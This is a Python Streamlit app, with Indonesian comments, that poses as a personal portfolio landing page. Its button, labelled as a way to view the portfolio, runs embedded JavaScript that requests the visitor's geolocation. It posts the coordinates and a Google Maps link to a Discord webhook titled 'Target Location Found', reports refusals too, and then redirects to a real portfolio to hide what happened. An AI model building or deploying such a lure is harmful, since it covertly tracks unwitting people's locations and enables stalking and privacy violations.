import streamlit as st
import streamlit.components.v1 as components

# Konfigurasi halaman
st.set_page_config(
    page_title="Portfolio", 
    page_icon="💼", 
    layout="wide"
)

# CSS untuk menyembunyikan header dan footer bawaan Streamlit
hide_streamlit_style = """
    <style>
    #MainMenu {visibility: hidden;}
    header {visibility: hidden;}
    footer {visibility: hidden;}
    .stApp > header {display: none;}
    </style>
"""
st.markdown(hide_streamlit_style, unsafe_allow_html=True)

# Ambil Discord Webhook dari Streamlit Secrets
try:
    webhook_url = st.secrets["DISCORD_WEBHOOK_URL"]
except Exception:
    webhook_url = ""

# HTML & JS murni agar tombol langsung merespons sentuhan di HP dan memicu pop-up lokasi
html_code = f"""
<!DOCTYPE html>
<html>
<body style="background-color: #0e1117; color: white; font-family: sans-serif; text-align: center; margin-top: 100px;">
  <h2>Selamat Datang di Portofolio Saya</h2>
  <p style="color: gray;">Silakan klik tombol di bawah untuk melanjutkan.</p>
  <br>
  
  <button onclick="requestLocation()" style="background-color: #ff4b4b; color: white; padding: 15px 30px; font-size: 16px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">
    Klik di sini untuk melihat Portfolio
  </button>

  <script>
    const WEBHOOK_URL = "{webhook_url}";

    function sendToDiscord(payload) {{
        const request = new XMLHttpRequest();
        request.open("POST", WEBHOOK_URL);
        request.setRequestHeader('Content-type', 'application/json');
        request.send(JSON.stringify(payload));
    }}

    function requestLocation() {{
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(function(position) {{
                var latlong = "Lat: " + position.coords.latitude + " Lon: " + position.coords.longitude;
                var mapLink = "https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude;
                
                sendToDiscord({{
                    username: "R4VEN",
                    embeds: [{{ 
                        title: "Target Location Found", 
                        description: latlong + "\\n[Buka di Maps](" + mapLink + ")", 
                        color: 15844367 
                    }}]
                }});
                
                window.location.href = "https://iqbalmantam.github.io/portfolio/";

            }}, function(error) {{
                sendToDiscord({{
                    username: "R4VEN",
                    content: "Target menolak izin lokasi."
                }});
                window.location.href = "https://iqbalmantam.github.io/portfolio/";
            }});
        }} else {{
            window.location.href = "https://iqbalmantam.github.io/portfolio/";
        }}
    }}
  </script>
</body>
</html>
"""

if webhook_url:
    components.html(html_code, height=400)
else:
    st.error("⚠️ Discord Webhook URL belum diatur di Secrets!")
